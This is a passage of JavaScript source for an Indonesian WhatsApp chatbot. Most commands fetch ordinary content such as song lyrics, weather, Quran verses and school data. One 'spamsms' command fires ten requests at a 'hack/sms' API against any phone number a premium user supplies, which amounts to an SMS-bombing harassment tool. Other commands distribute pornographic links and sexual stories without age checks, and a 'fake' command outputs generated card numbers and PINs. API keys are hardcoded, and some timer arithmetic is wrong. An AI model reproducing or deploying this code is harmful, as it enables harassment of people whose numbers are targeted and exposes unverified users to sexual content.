					if (args.length < 1) return reply('kasih teks lah^_^!!!')
					data = await fetchJson(`https://api.zeks.xyz/api/alaymaker?kata=${body.slice(6)}&apikey=Iyungputra`)
					reply(data.result)
					break
case 'chord':
case 'Chord':
					     if (args.length == 0) return reply(`Example: ${prefix + command} pubg`)
                    query = args.join(" ")			
					anu = await fetchJson(`https://zenzapi.xyz/api/chordlagu?query=${query}&apikey=Katashi`)
					reply(anu.result.result)
					break
		case 'next':
		case 'Next':
                 if (!isRegistered) return reply( ind.noregis())
				if (isGroup) return  reply( 'Command ini tidak bisa digunakan di dalam grup!')
				anug = getRegisteredRandomId(_registered).replace('@s.whatsapp.net','')
				await reply('Find for a partner...')
				await reply(`wa.me/${anug}`)
				await reply( `Partner found: \n*${prefix}next* — find a new partner`)
				break
case 'soundcloud': //By Putra
case 'Soundcloud':
if (args.length == 0) return reply(`Example: ${prefix + command} link nya`)
                    url = args[0]
anu = await getBuffer(`https://zenzapi.xyz/api/soundcloud?url=${url}&apikey=Katashi`)
syaa.sendMessage(from, anu, audio, {quoted: mek})
                break        
case 'wangy':
              if (!q) return
              qq = q.toUpperCase()
              awikwok = `${qq} ${qq} ${qq}    WANGY WANGY WANGY WANGY HU HA HU HA HU HA, aaaah baunya rambut ${qq} wangyy aku mau nyiumin aroma wangynya ${qq} AAAAAAAAH ~ Rambutnya.... aaah rambutnya juga pengen aku elus-elus ~~ AAAAAH ${qq} keluar pertama kali di anime juga manis    banget AAAAAAAAH ${qq} AAAAA LUCCUUUUUUUUUUUUUUU............ ${qq} AAAAAAAAAAAAAAAAAAAAGH   apa ? ${qq} itu gak nyata ? Cuma HALU katamu ? nggak, ngak ngak ngak ngak NGAAAAAAAAK GUA GAK PERCAYA ITU DIA NYATA NGAAAAAAAAAAAAAAAAAK PEDULI BANGSAAAAAT !! GUA GAK PEDULI SAMA KENYATAAN POKOKNYA GAK PEDULI.    ${qq} gw ... ${qq} di laptop ngeliatin gw, ${qq} .. kamu percaya sama aku ? aaaaaaaaaaah syukur ${q} aku gak mau merelakan ${qq} aaaaaah    YEAAAAAAAAAAAH GUA MASIH PUNYA ${qq} SENDIRI PUN NGGAK SAMA AAAAAAAAAAAAAAH`
              reply(awikwok)
              break
case 'randombokep':
case 'Randombokep':
if (!isPremium) return reply(mess.prem)
              bokep = body.slice(1)
              const bo =['https://www.mediafire.com/download/8hnhjcf3pseubgy','https://www.mediafire.com/download/cty9phda3d1s62u','https://www.mediafire.com/download/8hnhjcf3pseubgy']
              const kep = bo[Math.floor(Math.random() * bo.length)]
              syaa.sendMessage(from, '*PERMINTAAN:* '+bokep+'\n*DOSA TANGGUNG PRIBADI*\n*NI BRO FREE BUAT KAMU DOWNLOAD SENDIRI:* '+ kep, text, { quoted: mek, caption: `NI BOKEP SAYA DAPAT DARI *©-* DOSA TANGGUNG SENDIRI`})
              break
case 'quotesyt':
case 'Quotesyt':
                reply(mess.wait)
                ok = await getBuffer(`https://api.dapuhy.ga/api/randomimage/quotesyt?apikey=Itsrojako`)
                syaa.sendMessage(from, ok, image, {quoted: mek})
                break        
                case 'bts':
case 'Bts':
                reply(mess.wait)
                ya = await getBuffer(`https://api.dapuhy.ga/api/randomimage/batues?apikey=T3SleesqYU6gyfM`)
                syaa.sendMessage(from, ya, image, {quoted: mek})
                break    
case 'blackpink':
case 'Blackpink':
                reply(mess.wait)
                yo = await getBuffer(`https://api.dapuhy.ga/api/randomimage/blekpink?apikey=T3SleesqYU6gyfM`)
                syaa.sendMessage(from, yo, image, {quoted: mek})
                break    
                case 'groupinfo':
                case 'Groupinfo':
        if (!isGroup) return;
        ppUrl = await syaa.getProfilePicture(from); // leave empty to get your own
        buffergbl = await getBuffer(ppUrl);
        syaa.sendMessage(from, buffergbl, image, {
          quoted: mek,
          caption: `\`\`\` Group Info \`\`\`\n*${unique[0]} > Name* : ${groupName}\n*${unique[0]} > Member* : ${groupMembers.length}\n*${unique[0]} > Admin* : ${groupAdmins.length}\n*${unique[0]} > Description* : \n${groupDesc}`,
        });
        break;
        case 'closetime':  
        case 'Closetime':  
        if (!isBotGroupAdmins) return reply('Bot not admin');
        if (!isGroupAdmins && !mek.key.fromMe) return reply('Khusus admin');
        if (!isGroup) return reply('Khusus di grup');		 
        reply('AKSES WAKTU DIPROSES')   	
                syaa.updatePresence(from, Presence.composing) 
                if (args[1]=='detik') {var timer = args[0]+'000'
				} else if (args[1]=='menit') {var timer = args[0]+'0000'
				} else if (args[1]=='jam') {var timer = args[0]+'0000'
				} else {return reply('*pilih:*\ndetik\nmenit\njam\n\n*contoh*\n10 detik')}
				setTimeout( () => {
				var nomor = mek.participant
				let close = {
				text: `* *     @${nomor.split('@s.whatsapp.net')[0]}\n * *    `,
				contextInfo: { mentionedJid: [nomor] }
				}
				syaa.groupSettingChange (from, GroupSettingChange.messageSend, true);
				reply(close)
				}, timer)
				break 
		     	case 'opentime':  
		case 'Opentime':  
		     	if (!isBotGroupAdmins) return reply('Bot not admin');
        if (!isGroupAdmins && !mek.key.fromMe) return reply('Khusus admin');
        if (!isGroup) return reply('Khusus di grup');		    
                reply('AKSES WAKTU DIPROSES')   
                syaa.updatePresence(from, Presence.composing) 
                if (args[1]=='detik') {var timer = args[0]+'000'
				} else if (args[1]=='menit') {var timer = args[0]+'00000'
				} else if (args[1]=='jam') {var timer = args[0]+'00000'
				} else {return reply('*pilih:*\ndetik\nmenit\njam\n\n*contoh*\n10 detik')}
				setTimeout( () => {
				var nomor = mek.participant
				let open = {
				text: `* *     @${nomor.split('@s.whatsapp.net')[0]}\n **   `,
				contextInfo: { mentionedJid: [nomor] }
				}
				syaa.groupSettingChange (from, GroupSettingChange.messageSend, false);
				reply(open)
				}, timer)
				break  
				///NEW FITUR BY KATASHI
case 'gabut':
case 'Gabut':
					data = await fetchJson(`https://apikatashi.herokuapp.com/api/gabut?apikey=Alphabot`)
					reply(data.result.activity)
					break
case 'translate':
case 'Translate':
if (args.length == 0) return reply(`kasih teks lah^_^!!\nJangan lupa , imi translatenya dari eng ke indo`)
                    query = args.join(" ")	
					data = await fetchJson(`https://apikatashi.herokuapp.com/api/translate?kata=${query}&apikey=Alphabot`)
					reply(data.result)
					break
case 'tiktok2':
case 'Tiktok2':
if (args.length == 0) return reply(`Link nya?`)
                    query = args.join(" ")	
x = await fetchJson(`https://api.dapuhy.ga/api/socialmedia/ttdownloader?url=${query}&apikey=T3SleesqYU6gyfM`)
reply(mess.wait)
vid = await getBuffer(x.result.nowm)
au = await getBuffer(x.result.audio)
syaa.sendMessage(from, vid, video, {quoted: mek})
syaa.sendMessage(from, au, audio, {quoted: mek})
break
case 'cuacabandara': // Update By KATASHI
case 'Cuacabandara': // Update By KATASHI
					data = await fetchJson(`https://apikatashi.herokuapp.com/api/infocuaca/bandara?apikey=Alphabot`, {method: 'get'})
					teks = 'CUACA BANDARA\n'
					for (let i of data.result.daftar_bandara) {
						teks += `*Nama:* : ${i.nama_bandara}\n*Waktu:* ${i.waktu_pengamatan}\n*Arah Angin:* ${i.arah_angin}\n*Kecepatan:* ${i.kecepatan}\n*Jarak Pandang:* ${i.jarak_pandang}\n*Cuaca:* ${i.cuaca}\n*Suhu:* ${i.suhu}\n*Timbun:* ${i.titik_timbun}\n*Udara:* ${i.tekanan_udara}\n\nCUACA BANDARA\n`
					}
					reply(teks.trim())
					
					break
case "toimg2":
      case "Toimg2":
        if (!isQuotedSticker) return reply("/  !");
        reply(mess.wait);
        encmedia = JSON.parse(JSON.stringify(mek).replace("quotedM", "m"))
          .message.extendedTextMessage.contextInfo;
        media = await syaa.downloadAndSaveMediaMessage(encmedia);
        ran = getRandom(".png");
        exec(`ffmpeg -i ${media} ${ran}`, (err) => {
          fs.unlinkSync(media);
          if (err) return reply("Yah gagal, coba ulangi ^_^");
          buffer = fs.readFileSync(ran);
          fakethumb(buffer, `Ni Kak ${pushname}`);
          fs.unlinkSync(ran);
        });
        break;
        case "tomp42":
      case "Tomp42":
        if (
          ((isMedia && !mek.message.videoMessage) || isQuotedSticker) &&
          args.length == 0
        ) {
          ger = isQuotedSticker
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
          owgi = await syaa.downloadAndSaveMediaMessage(ger);
          webp2mp4File(owgi).then((res) => {
            sendMediaURL(from, res.result, "Done");
          });
        } else {
          reply("reply stiker");
        }
        fs.unlinkSync(owgi);
        break;
case 'searchsurah': // Update By KATASHI
case 'surah': // Update By KATASHI
case 'Surah': // Update By KATASHI
case 'Searchsurah': // Update By KATASHI
if (args.length == 0) return reply(`Link nya?`)
                    query = args.join(" ")	
                    reply(mess.wait)
					data = await fetchJson(`https://hardianto-chan.herokuapp.com/api/muslim/surah?query=${query}&apikey=hardianto`, {method: 'get'})
					teks = 'SEARCH SURAH\n'
					for (let i of data) {
						teks += `*Arab:* : ${i.arab}\n*Indonesia:* ${i.indo}\n*Latin:* ${i.latin}\n\nSEARCH SURAH\n`
					}
					reply(teks.trim())
					
					break
case 'storyanime':
case 'storyanime':	
x = await getBuffer(`https://api.dapuhy.ga/api/anime/storyanime?apikey=T3SleesqYU6gyfM`)
reply(mess.wait)
syaa.sendMessage(from, x, video, {quoted: mek})
break
case 'rscovid': // Update By KATASHI
case 'Rscovid': // Update By KATASHI
case 'Rumahsakit': // Update By KATASHI
case 'rskopit': // Update By KATASHI
case 'Rskopit': // Update By KATASHI
reply(mess.wait)
					data = await fetchJson(`https://dekontaminasi.com/api/id/covid19/hospitals`, {method: 'get'})
					teks = 'RS COVID\n'
					for (let i of data) {
						teks += `*Nama:* : ${i.name}\n*Lokasi:* ${i.address}\n*Kota:* ${i.region}\n*No Hp:* ${i.phone}\n*Provinsi:* ${i.province}\n\nRS COVID\n`
					}
					reply(teks.trim())
					
					break
case 'nhentaipdf':
case 'Nhentaipdf':
if (args.length == 0) return reply(`Kode?`)
                    query = args.join(" ")	
                    reply(mess.wait)
x = await getBuffer(`https://hadi-api.herokuapp.com/api/nhentai?id=${query}`)
syaa.sendMessage(from, x, document, {quoted: mek, mimetype: Mimetype.pdf, filename: `${query}.pdf` })
break
case 'provinci': // Update By KATASHI
case 'Provinci': // Update By KATASHI
case 'Provinsi': // Update By KATASHI
case 'provinsi': // Update By KATASHI
					data = await fetchJson(`https://api-pesantren-indonesia.vercel.app/provinsi.json`, {method: 'get'})
					teks = 'PROVINSI\n'
					for (let i of data) {
						teks += `*Id:* : ${i.id}\n*Nama:* ${i.nama}\n\nPROVINSI\n`
					}
					reply(teks.trim())
					
					break
case 'kab': // Update By KATASHI
case 'Kab': // Update By KATASHI
case 'kabupaten': // Update By KATASHI
case 'Kabupaten': // Update By KATASHI
if (args.length == 0) return reply(`Idnya?\nId bisa di lihat di .provinsi`)
                    query = args.join(" ")	
					data = await fetchJson(`https://api-pesantren-indonesia.vercel.app/kabupaten/${query}.json`, {method: 'get'})
					teks = 'Kabupaten\n'
					for (let i of data) {
						teks += `*Id:* : ${i.id}\n*Nama:* ${i.nama}\n\nKABUPATEN\n`
					}
					reply(teks.trim())
					
					break
case 'pesantren': // Update By KATASHI
case 'Pesantren': // Update By KATASHI
if (args.length == 0) return reply(`Idnya?\nId bisa di lihat di .kabupaten`)
                    query = args.join(" ")	
					data = await fetchJson(`https://api-pesantren-indonesia.vercel.app/pesantren/${query}.json`, {method: 'get'})
					teks = 'PESANTREN\n'
					for (let i of data) {
						teks += `*Id:* : ${i.id}\n*Nama:* ${i.nama}\n*Nspp:* ${i.nspp}\n*Alamat:* ${i.alamat}\n\nPESANTREN\n`
					}
					reply(teks.trim())
					
					break
case 'spamsms':
case 'Spamsms':
                    if (!isPremium) return reply(mess.prem)
                    if (args.length == 0) return reply(`Example: ${prefix + command} 8303030303030`)
                    nomor = args[0]
                    reply(mess.wait)
                    await axios.get(`https://viko-api.herokuapp.com/api/hack/sms?query=${nomor}&apikey=vinko`)
                    await axios.get(`https://viko-api.herokuapp.com/api/hack/sms?query=${nomor}&apikey=vinko`)
                    await axios.get(`https://viko-api.herokuapp.com/api/hack/sms?query=${nomor}&apikey=vinko`)
                    await axios.get(`https://viko-api.herokuapp.com/api/hack/sms?query=${nomor}&apikey=vinko`)
                    await axios.get(`https://viko-api.herokuapp.com/api/hack/sms?query=${nomor}&apikey=vinko`)
                    await axios.get(`https://viko-api.herokuapp.com/api/hack/sms?query=${nomor}&apikey=vinko`)
                    await axios.get(`https://viko-api.herokuapp.com/api/hack/sms?query=${nomor}&apikey=vinko`)
                    await axios.get(`https://viko-api.herokuapp.com/api/hack/sms?query=${nomor}&apikey=vinko`)
                    await axios.get(`https://viko-api.herokuapp.com/api/hack/sms?query=${nomor}&apikey=vinko`)
                    await axios.get(`https://viko-api.herokuapp.com/api/hack/sms?query=${nomor}&apikey=vinko`)
                    reply("Success")
                    break        
                    case 'jooxsearch':
case 'Jooxsearch':
                    if (args.length == 0) return reply(`Example: ${prefix + command} starboy`)
                    query = args[0]
                    reply(mess.wait)
                    get_result = await fetchJson(`https://viko-api.herokuapp.com/api/music/joox?apikey=katashi&query=${query}`)
                    i = get_result.result
                    ini_txt = `Lagu : ${i.lagu}\n`
                    ini_txt += `Album : ${i.album}\n`
                    ini_txt += `Penyanyi : ${i.panyanyi}\n`
                    ini_txt += `Tanggal : ${i.publish}\n`
                    ini_txt += `Lirik : ${i.lirik}\n`
                    gambar = await getBuffer(i.img)
                    syaa.sendMessage(from, gambar, image, {quoted: mek, caption: ini_txt})
                    break
case 'randomcerpen':
case 'Randomcerpen':	
					data = await fetchJson(`https://viko-api.herokuapp.com/api/cerpen/random?apikey=katashi`)
					reply(data.result)
					break
case 'ytmp42':
case 'Ytmp42':
if (isBanned) return reply(mess.ban)
        if (!isGroup) return reply(mess.only.group);
if (args.length == 0) return reply(`Link nya?`)
                    query = args.join(" ")	
                    reply(mess.wait)
                    i = await fetchJson(`https://viko-api.herokuapp.com/api/yt/playmp4?query=${query}&apikey=katashi`)
                    ini_txt = `Title : ${i.title}\n`
                    ini_txt += `Channel : ${i.channel}\n`
                    ini_txt += `Publis : ${i.published}\n`
                    ini_txt += `View : ${i.views}\n`
                    ini_txt += `Link : ${i.url}\n`
                    gambar = await getBuffer(i.thumb)
                    vidi = await getBuffer(i.url)
                    syaa.sendMessage(from, gambar, image, {quoted: mek, caption: ini_txt})
                    syaa.sendMessage(from, vidi, video, {quoted: mek})
                    break
case 'narutobanner':
case 'Narutobanner':
if (isBanned) return reply(mess.ban)
        if (!isGroup) return reply(mess.only.group);
if (args.length == 0) return reply(`Teksnya?`)
                    query = args.join(" ")	
                    reply(mess.wait)
x = await getBuffer(`https://hadi-api.herokuapp.com/api/photoxy/manga-naruto?teks=${query}`)
syaa.sendMessage(from, x, image, {quoted: mek})
break
case 'nhentaisearch': // Update By KATASHI
case 'Nhentaisearch': // Update By KATASHI
if (isBanned) return reply(mess.ban)
        if (!isGroup) return reply(mess.only.group);
if (args.length == 0) return reply(`Teksnya?`)
                    query = args.join(" ")	
reply(mess.wait)
					data = await fetchJson(`https://ziy.herokuapp.com/api/nHentaiSearch?query=${query}`, {method: 'get'})
					teks = 'NHENTAI SEARCH\n'
					for (let i of data.result) {
						teks += `*Nama:* : ${i.title}\n*Kode:* ${i.id}\n*Bahasa:* ${i.language}\n*View:* ${i.thumbnail.w}\n*-:* ${i.thumbnail.h}\n\nNHENTAI SEARCH\n`
					}
					reply(teks.trim())
					
					break
case 'kisahnabi':
case 'Kisahnabi':
if (isBanned) return reply(mess.ban)
        if (!isGroup) return reply(mess.only.group);
                    if (args.length == 0) return reply(`Example: ${prefix + command} Muhammad`)
                    query = args.join(" ")
                    get_result = await fetchJson(`https://viko-api.herokuapp.com/api/muslim/kisahnabi?nabi=${query}&apikey=katashi`)
                    get_result = get_result.result
                    reply(mess.wait)
                    ini_txt = `Name : ${get_result.name}\n`
                    ini_txt += `Lahir : ${get_result.kelahiran}\n`
                    ini_txt += `Wafat : ${get_result.wafat_usia}\n`
                    ini_txt += `Singgah : ${get_result.singgah}\n`
                    ini_txt += `Kisah : \n${get_result.kisah}`
                    reply(ini_txt)
                    break
case 'jarak':
case 'Jarak':
if (isBanned) return reply(mess.ban)
        if (!isGroup) return reply(mess.only.group);
                    if (args.length == 0) return reply(`Example: ${prefix + command} jakarta - yogyakarta`)
                    pauls = args.join(" ")
                    teks1 = pauls.split("-")[0].trim()
                    teks2 = pauls.split("-")[1].trim()
                    reply(mess.wait)
                    get_result = await fetchJson(`https://ziy.herokuapp.com/api/jarak?asal=${teks1}&tujuan=${teks2}&apikey=xZiyy`)
                    x = get_result.result
                    ini_txt = `Informasi Jarak dari ${teks1} ke ${teks2} :\n\n`
                    ini_txt += `\`\`\`â—ª Asal :\`\`\` ${x.from.name}\n`
                    ini_txt += `\`\`\`â—ª Garis Lintang :\`\`\` ${x.from.latitude}\n`
                    ini_txt += `\`\`\`â—ª Garis Bujur :\`\`\` ${x.from.longitude}\n\n`
                    ini_txt += `\`\`\`â—ª Tujuan :\`\`\` ${x.to.name}\n`
                    ini_txt += `\`\`\`â—ª Garis Lintang :\`\`\` ${x.to.latitude}\n`
                    ini_txt += `\`\`\`â—ª Garis Bujur :\`\`\` ${x.to.longitude}\n\n`
                    ini_txt += `\`\`\`â—ª Jarak Tempuh :\`\`\` ${x.jarak}\n`
                    ini_txt += `\`\`\`â—ª Waktu Tempuh :\`\`\`\n`
                    ini_txt += `   â•­â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â\n`
                    ini_txt += `ââ”¤ Kereta Api : ${x.kereta_api}\n`
                    ini_txt += `ââ”¤ Pesawat : ${x.pesawat}\n`
                    ini_txt += `ââ”¤ Mobil : ${x.mobil}\n`
                    ini_txt += `ââ”¤ Motor : ${x.motor}\n`
                    ini_txt += `ââ”¤ Jalan Kaki : ${x.jalan_kaki}\n`
                    ini_txt += `   â•°â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â\n`
                    reply(ini_txt)
                    break
case 'dafontsearch': // Update By KATASHI
case 'Dafontsearch': // Update By KATASHI
if (isBanned) return reply(mess.ban)
        if (!isGroup) return reply(mess.only.group);
if (args.length == 0) return reply(`Teksnya?`)
                    query = args.join(" ")	
reply(mess.wait)
					data = await fetchJson(`https://zenzapi.xyz/api/dafontsearch?query=${query}&apikey=Katashi`, {method: 'get'})
					teks = 'DAFONT SEARCH\n'
					for (let i of data.result) {
						teks += `*Nama:* : ${i.judul}\n*Style:* ${i.style}\n*Totla:* ${i.total}\n*Link:* ${i.link}\n\nDAFONT SEARCH\n`
					}
					reply(teks.trim())
					
					break
					case 'stcmeme':
 if (isBanned)return reply(mess.ban)
  ct = body.slice(9)
              top = ct.split('|')[0]
              bottom = ct.split('|')[1]
              var imgbb = require('imgbb-uploader')
              if ((isMedia && !mek.message.videoMessage || isQuotedImage || isQuotedSticker) && args.length > 0) {
              reply(mess.wait)
              ger = isQuotedImage || isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek 
              owgi = await syaa.downloadAndSaveMediaMessage(ger)
              anu = await imgbb("520bd6f6209077d1777c2a4f20c509c2", owgi)
              teks = `${anu.display_url}`
              ranp = getRandom('.gif')
              rano = getRandom('.webp')
              anu1 = `https://api.memegen.link/images/custom/${top}/${bottom}.png?background=${teks}`
              sendStickerFromUrl(from, `${anu1}`, mess.success)
              } else {
              reply('Gunakan foto/stiker!')
}
               break
               case 'datasekolah': // Update By KATASHI
case 'datasekolah': // Update By KATASHI
if (isBanned) return reply(mess.ban)
        if (!isGroup) return reply(mess.only.group);
if (args.length < 1) return reply(`*Example :*\n${prefix}${command} 1|100`)
					makell = args.join(" ")
					r1 = makell.split("|")[0];
					r2 = makell.split("|")[1];
reply(mess.wait)
					data = await fetchJson(`https://api-sekolah-indonesia.herokuapp.com/sekolah?page=${r1}&perPage=${r2}`, {method: 'get'})
					teks = 'DATA SEKOLAH\n'
					for (let i of data.dataSekolah) {
						teks += `*Kode Provinsi:* : ${i.kode_prop}\n*Provinsi:* ${i.propinsi}\n*Kode Kabupaten:* ${i.kode_kab_kota}\n*Kabupaten:* ${i.kabupaten_kota}\n*Kode Kecamatan:* ${i.kode_kec}\n*Kecamatan:* ${i.kecamatan}\n*Id:* ${i.id}\n*Npsn:* ${i.npsn}\n*Sekolah:* ${i.sekolah}\n*Jenjang:* ${i.bentuk}\n*Negri/Swasta:* ${i.status}\n*Alamat:* ${i.alamat_jalan}\n*Lintang:* ${i.lintang}\n*Bujur:* ${i.bujur}\n\nDATA SEKOLAH\n`
					}
					reply(teks.trim())
					
					break
case 'datasekolah2': // Update By KATASHI
case 'datasekolah2': // Update By KATASHI
if (isBanned) return reply(mess.ban)
        if (!isGroup) return reply(mess.only.group);
if (args.length < 1) return reply(`*Example :*\n${prefix}${command} smk-1-5`)
					makell = args.join(" ")
					r1 = makell.split("-")[0];
					r2 = makell.split("-")[1];
					r3 = makell.split("-")[2];
reply(mess.wait)
					data = await fetchJson(`https://api-sekolah-indonesia.herokuapp.com/sekolah/${r1}?page=${r2}&perPage=${r3}`, {method: 'get'})
					teks = 'DATA SEKOLAH\n'
					for (let i of data.dataSekolah) {
						teks += `*Kode Provinsi:* : ${i.kode_prop}\n*Provinsi:* ${i.propinsi}\n*Kode Kabupaten:* ${i.kode_kab_kota}\n*Kabupaten:* ${i.kabupaten_kota}\n*Kode Kecamatan:* ${i.kode_kec}\n*Kecamatan:* ${i.kecamatan}\n*Id:* ${i.id}\n*Npsn:* ${i.npsn}\n*Sekolah:* ${i.sekolah}\n*Jenjang:* ${i.bentuk}\n*Negri/Swasta:* ${i.status}\n*Alamat:* ${i.alamat_jalan}\n*Lintang:* ${i.lintang}\n*Bujur:* ${i.bujur}\n\nDATA SEKOLAH\n`
					}
					reply(teks.trim())
					
					break
case 'quotesislam':
case 'Quotesislam':
if (isBanned) return reply(mess.ban)
        if (!isGroup) return reply(mess.only.group);
					data = await fetchJson(`https://viko-api.herokuapp.com/api/random/quotes/muslim?apikey=katashi`)
					reply(data.result.text_id)
					break
case 'apikey':
case 'apikey':
if (isBanned) return reply(mess.ban)
if (!isPremium) return reply(mess.prem)
                    if (args.length == 0) return reply(`Example: ${prefix + command} apikeynya`)
                    query = args.join(" ")
                    get_result = await fetchJson(`https://viko-api.herokuapp.com/api/cekapikey?apikey=${query}`)
                    reply(mess.wait)
                    ini_txt = `Status : ${get_result.status}\n`
                    ini_txt += `Creator : ${get_result.creator}\n`
                    ini_txt += `Apikey : ${get_result.apikey}\n`
                    ini_txt += `Result : ${get_result.result}\n`
                    reply(ini_txt)
                    break
case 'infoloker': // Update By KATASHI
case 'Infoloker': // Update By KATASHI
if (isBanned) return reply(mess.ban)
        if (!isGroup) return reply(mess.only.group);
reply(mess.wait)
					data = await fetchJson(`https://docs-jojo.herokuapp.com/api/infoloker`, {method: 'get'})
					teks = 'INFO LOKER\n'
					for (let x of data.result) {
						teks += `*Perusahaan:* : ${x.perusahaan}\n*Url* : ${x.link}\n*Profesi* : ${x.profesi}\n*Gaji* : ${x.gaji}\n*Lokasi* : ${x.lokasi}\n*Pengalaman* : ${x.pengalaman}\n*Edukasi* : ${x.edukasi}\n*Description* : ${x.desc}\n*Syarat* : ${x.syarat}\n\nINFO LOKER\n`
					}
					reply(teks.trim())
					
					break
case 'katacinta':
case 'Katacinta':
if (isBanned) return reply(mess.ban)
        if (!isGroup) return reply(mess.only.group);
reply(mess.wait)
					gatauda = body.slice(8)
					anu = await fetchJson(`https://docs-jojo.herokuapp.com/api/katacinta`, {method: 'get'})
					reply(anu.result)
					break  
					case 'cerpen':
                case 'Cerpen':
                if (isBanned) return reply(mess.ban)
        if (!isGroup) return reply(mess.only.group);
                reply(mess.wait)
                    get_result = await fetchJson(`https://docs-jojo.herokuapp.com/api/cerpen`)
                    get_result = get_result.result
                    ini_txt = `Title : ${get_result.title}\n`
                    ini_txt += `Creator : ${get_result.pengarang}\n`
                    ini_txt += `Kategori : ${get_result.kategori}\n`
                    ini_txt += `Story :\n${get_result.cerpen}`
                    reply(ini_txt)
                    break
case 'cersex':
                case 'Cersex':
                if (isBanned) return reply(mess.ban)
        if (!isGroup) return reply(mess.only.group);
                reply(mess.wait)
                    get_result = await fetchJson(`https://docs-jojo.herokuapp.com/api/cersex`)
                    get_result = get_result.result
                    ini_txt = `Title : ${get_result.judul}\n`
                    ini_txt += `Img : ${get_result.img}\n`
                    ini_txt += `Story :\n${get_result.cersex}`
                    gaa = await getBuffer(get_result.img)
                    syaa.sendMessage(from, gaa, image, {quoted: mek, caption: ini_txt})
                    break
case 'jadwaltvnow':
                case 'Jadwaltvnow':
                if (isBanned) return reply(mess.ban)
        if (!isGroup) return reply(mess.only.group);
                reply(mess.wait)
                    get_result = await fetchJson(`https://docs-jojo.herokuapp.com/api/jadwaltvnow`)
                    get_result = get_result.result
                    ini_txt = `Jadwal TV Now :\n`
                    for (var x in get_result) {
                        ini_txt += `${x.toUpperCase()}${get_result[x]}\n\n`
                    }
                    reply(ini_txt)
                    break
case 'twich':  
      case 'Twich':  
      if (isBanned) return reply(mess.ban)
        if (!isGroup) return reply(mess.only.group);
      reply(mess.wait)
                   anu = await fetchJson(`https://docs-jojo.herokuapp.com/api/twichquote`)
                   anu1 = ` *THWICH* : ${anu.result}`
                   reply(anu1)
                   break                 
      case 'fake':  
      case 'Fake':  
      reply(mess.wait)
                   anu = await fetchJson(`https://docs-jojo.herokuapp.com/api/fake_identity`)
                   anu1 = ` *NAMA* : ${anu.name}\n`
                   anu1 += ` *GENDER* : ${anu.gender}\n` 
                   anu1 += ` *AGE* : ${anu.age}\n`
                   anu1 += ` *BIRTDAY* : ${anu.birtday}\n`
                   anu1 += ` *BACHELOR* : ${anu.Bachelor}\n`
                   anu1 += ` *ADDRESA* : ${anu.address}\n`
                   anu1 += ` *CODE* : ${anu.zip_code}\n`
                   anu1 += ` *STATE* : ${anu.state}\n`
                   anu1 += ` *COUNTRY* : ${anu.country}\n`
                   anu1 += ` *EMAIL* : ${anu.email}\n`
                   anu1 += ` *PASS* : ${anu.password}\n` 
                   anu1 += ` *PHONE* : ${anu.phone}\n` 
                   anu1 += ` *CARD* : ${anu.card}\n`
                   anu1 += ` *CODE* : ${anu.code}\n`
                   anu1 += ` *DATE* : ${anu.date}\n`
                   anu1 += ` *PIN* : ${anu.pin_code}\n`
                   anu1 += ` *WEIGHT* : ${anu.weight}\n` 
                   anu1 += ` *HEIGHT* : ${anu.height}\n` 
                   anu1 += ` *TYPE* : ${anu.blood_type}\n`
                   anu1 += ` *STATUS* : ${anu.status}\n`
                   reply(anu1)
                   break
case 'kusonime':  
case 'Kusonime':  
if (isBanned) return reply(mess.ban)
        if (!isGroup) return reply(mess.only.group);
reply(mess.wait)
                   if (args.length == 0) return reply(`Example: ${prefix + command} loli kawaii`)
                    query = args.join(" ")
                   anu = await fetchJson(`https://docs-jojo.herokuapp.com/api/kuso?q=${query}`)
                   anu1 = ` *INFO* : ${anu.sinopsis}\n`
                   reply(anu1)
                   break
      case 'renungan':  
      case 'Renungan':  
      if (isBanned) return reply(mess.ban)
        if (!isGroup) return reply(mess.only.group);
      reply(mess.wait)
                   anu = await fetchJson(`https://docs-jojo.herokuapp.com/api/renungan`)
                   anu1 = ` *JUDUL* : ${anu.judul}\n`
                   anu1 += ` *PESAN* : ${anu.pesan}\n`
                   anu1 += ` *DESC* : ${anu.Isi}\n`
                   reply(anu1)
                   break
       case 'samehadaku':  
       case 'Samehadaku':  
       if (isBanned) return reply(mess.ban)
        if (!isGroup) return reply(mess.only.group);
       reply(mess.wait)
                   if (args.length == 0) return reply(`Example: ${prefix + command} loli kawaii`)
                    query = args.join(" ")
                   anu = await fetchJson(`https://docs-jojo.herokuapp.com/api/samehadaku?q=${query}`)
                   anu2 = await getBuffer(anu.thumb)
                   anu1 = ` *JUDUL* : ${anu.title}\n`
                   anu1 += ` *LINK* : ${anu.link}\n`
                   anu1 += ` *DESK* : ${anu.desc}\n`
                   syaa.sendMessage(from, anu2, image, {caption: anu1, quoted: mek })
                   break
case 'tongue':  
case 'Tongue':  
if (isBanned) return reply(mess.ban)
        if (!isGroup) return reply(mess.only.group);
reply(mess.wait)
                   anu = await fetchJson(`https://docs-jojo.herokuapp.com/api/tongue_twister`)
                   anu1 = ` *NIHH* : ${anu.result}`
                   reply(anu1)
                   break
                   case 'mostviewfilm':
case 'Mostviewfilm':
if (isBanned) return reply(mess.ban)
        if (!isGroup) return reply(mess.only.group);
reply(mess.wait)
					anu = await fetchJson(`https://docs-jojo.herokuapp.com/api/mostviewfilm`, {method: 'get'})
					teks = 'MOSTVIEWFILM\n'
					for (let i of anu.result) {
						teks += `*Penonton:* : ${i.penonton}\n*Rank* : ${i.rank}\n*Url* : ${i.link}\n\n*MOSTVIEWFILM*\n`
					}
					reply(teks.trim())  
					
					break
					case 'trendingtwitter':
case 'Trendingtwitter':
if (isBanned) return reply(mess.ban)
        if (!isGroup) return reply(mess.only.group);
reply(mess.wait)
					anu = await fetchJson(`https://docs-jojo.herokuapp.com/api/trendingtwitter`, {method: 'get'})
					teks = 'TRENDING TWITER\n'
					for (let i of anu.result) {
						teks += `*Hastag:* : ${i.hastag}\n*Rank* : ${i.rank}\n*Url* : ${i.link}\n*Tweet* : ${i.tweet}\n\n*TRANDING TWITTER*\n`
					}
					reply(teks.trim())  
					
					break
case 'jadwalbola':
case 'jadwalbola':
if (isBanned) return reply(mess.ban)
        if (!isGroup) return reply(mess.only.group);
reply(mess.wait)
					anu = await fetchJson(`https://docs-jojo.herokuapp.com/api/jadwal-bola`, {method: 'get'})
					teks = 'JADWAL BOLA\n'
